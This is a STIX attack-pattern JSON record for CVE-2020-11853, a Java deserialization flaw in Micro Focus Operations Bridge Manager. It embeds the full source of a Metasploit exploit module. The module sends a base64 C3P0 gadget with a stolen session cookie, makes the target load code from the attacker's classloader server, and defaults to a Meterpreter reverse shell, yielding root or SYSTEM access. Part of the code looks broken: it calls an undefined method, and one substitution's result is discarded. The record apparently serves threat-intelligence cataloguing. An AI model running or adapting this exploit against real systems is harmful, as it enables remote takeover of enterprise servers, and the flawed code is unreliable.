{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f9d9003-72f7-4a4c-977a-61cfa6f2139a",
    "created": "2024-08-14T17:08:42.012825Z",
    "modified": "2024-08-14T17:08:42.012829Z",
    "name": "Micro Focus Operations Bridge Manager Authenticated Remote Code Execution",
    "description": " This module exploits an authenticated Java deserialization that affects a truckload of Micro Focus products: Operations Bridge Manager, Application Performance Management, Data Center Automation Universal CMDB, Hybrid Cloud Management and Service Management Automation. However this module was only tested on Operations Bridge Manager. Exploiting this vulnerability will result in remote code execution as the root user on Linux or the SYSTEM user on Windows. Authentication is required, the module user needs to login to the application and obtain the authenticated LWSSO_COOKIE_KEY, which should be fed to the module. Any authenticated user can exploit this vulnerability, even the lowest privileged ones. For more information refer to the advisory link below. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/microfocus_obm_auth_rce.rb",
            "external_id": "microfocus_obm_auth_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11853"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Java::HTTP::ClassLoader\n  prepend Msf::Exploit::Remote::AutoCheck\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Micro Focus Operations Bridge Manager Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an authenticated Java deserialization that affects a truckload of Micro\n          Focus products: Operations Bridge Manager, Application Performance Management, Data Center Automation,\n          Universal CMDB, Hybrid Cloud Management and Service Management Automation. However this module\n          was only tested on Operations Bridge Manager.\n          Exploiting this vulnerability will result in remote code execution as the root user on Linux or\n          the SYSTEM user on Windows.\n          Authentication is required, the module user needs to login to the application and obtain the\n          authenticated LWSSO_COOKIE_KEY, which should be fed to the module. Any authenticated user can\n          exploit this vulnerability, even the lowest privileged ones.\n          For more information refer to the advisory link below.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md'],\n          [ 'CVE', '2020-11853'],\n          [ 'ZDI', '20-1327'],\n        ],\n        'DisclosureDate' => '2020-10-28',\n        'License' => MSF_LICENSE,\n        'Platform' => 'java',\n        'Arch' => ARCH_JAVA,\n        'Privileged' => true,\n        'Targets' => [\n          ['Micro Focus Operations Bridge Manager <= 2020.05 (and many other MF products)', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'java/meterpreter/reverse_tcp'\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),\n      OptString.new('LWSSO_COOKIE_KEY', [true, 'Authenticated LWSSO_COOKIE_KEY session cookie'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/topaz/login.jsp')\n    })\n\n    # unfortunately could not find an easy way to detect the version running, even when auth\n    if res && res.code == 200 && res.body.include?('Login - Operations Bridge Manager')\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    # Start our HTTP server to provide remote classloading\n    @classloader_uri = start_service\n\n    unless @classloader_uri\n      fail_with(Failure::BadConfig, 'Could not start remote classloader server')\n    end\n\n    print_good(\"Started remote classloader server at #{@classloader_uri}\")\n\n    # heh, we got two of these, let's pick one randomly!\n    vuln_uri = [\n      '/legacy/topaz/sitescope/conf/registration',\n      '/legacy/topaz/sitescope/conf/download'\n    ].sample\n\n    # Send our remote classloader gadget to the target, triggering the vuln\n    send_request_gadget(\n      normalize_uri(target_uri.path, vuln_uri)\n    )\n  end\n\n  # Convenience method to send our gadget to a URI\n  def send_request_gadget(uri)\n    print_status(\"Sending remote classloader gadget to #{full_uri(uri)}\")\n\n    send_request_raw({\n      'method' => 'POST',\n      'uri' => uri,\n      'cookie' => \"LWSSO_COOKIE_KEY=#{datastore['LWSSO_COOKIE_KEY']}\",\n      'headers' => { 'Content-Type' => 'application/octet-stream' },\n      'data' => go_go_gadget\n    }, 0)\n  end\n\n  # C3P0 payload generated with a ysoserial jar\n  # The ysoserial jar needs to be built with c3p0 version 0.9.1.2 as that is what the target uses\n  # See the advisory for details.\n  #\n  # java -jar ysoserial-0.0.6-SNAPSHOT-all-c3p0-0.9.1.2.jar C3P0 'http://whatever/:ExploitClass' | base64\n  def go_go_gadget\n    gadget = Rex::Text.decode_base64(\n      <<~EOF\n        rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNlZoRH/BzETxgC\n        AAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3Vy\n        Y2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFT\n        b3VyY2VCYXNlAAAAAAAAAAEDAAdJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xE\n        YXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNv\n        dXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABRmYWN0b3J5Q2xhc3NMb2NhdGlvbnEAfgAE\n        TAANaWRlbnRpdHlUb2tlbnEAfgAETAADcGNzdAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VT\n        dXBwb3J0O0wAA3Zjc3QAIkxqYXZhL2JlYW5zL1ZldG9hYmxlQ2hhbmdlU3VwcG9ydDt4cHcCAAFz\n        cgA9Y29tLm1jaGFuZ2UudjIubmFtaW5nLlJlZmVyZW5jZUluZGlyZWN0b3IkUmVmZXJlbmNlU2Vy\n        aWFsaXplZGIZhdDRKsITAgAETAALY29udGV4dE5hbWV0ABNMamF2YXgvbmFtaW5nL05hbWU7TAAD\n        ZW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAEbmFtZXEAfgAJTAAJcmVmZXJlbmNldAAYTGph\n        dmF4L25hbWluZy9SZWZlcmVuY2U7eHBwcHBzcgAWamF2YXgubmFtaW5nLlJlZmVyZW5jZejGnqKo\n        6Y0JAgAETAAFYWRkcnN0ABJMamF2YS91dGlsL1ZlY3RvcjtMAAxjbGFzc0ZhY3RvcnlxAH4ABEwA\n        FGNsYXNzRmFjdG9yeUxvY2F0aW9ucQB+AARMAAljbGFzc05hbWVxAH4ABHhwc3IAEGphdmEudXRp\n        bC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwAL\n        ZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFu\n        Zy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQADEV4cGxvaXRDbGFzc3QAEGh0\n        dHA6Ly93aGF0ZXZlci90AAdleHBsb2l0cHBwdwQAAAAAeHcCAAF4\n      EOF\n    )\n\n    # Replace length-prefixed placeholder strings with our own\n    gadget.sub!(\"\\x00\\x10http://whatever/\", packed_classloader_uri)\n    gadget.sub!(\"\\x00\\x07exploit\", packed_class_name)\n    gadget.sub(\"\\x00\\x0cExploitClass\", packed_class_name)\n  end\n\n  # Convenience method to pack the classloader URI as a length-prefixed string\n  def packed_classloader_uri\n    \"#{[@classloader_uri.length].pack('n')}#{@classloader_uri}\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-10-28",
    "x_mitre_platforms": [
        "java'"
    ]
}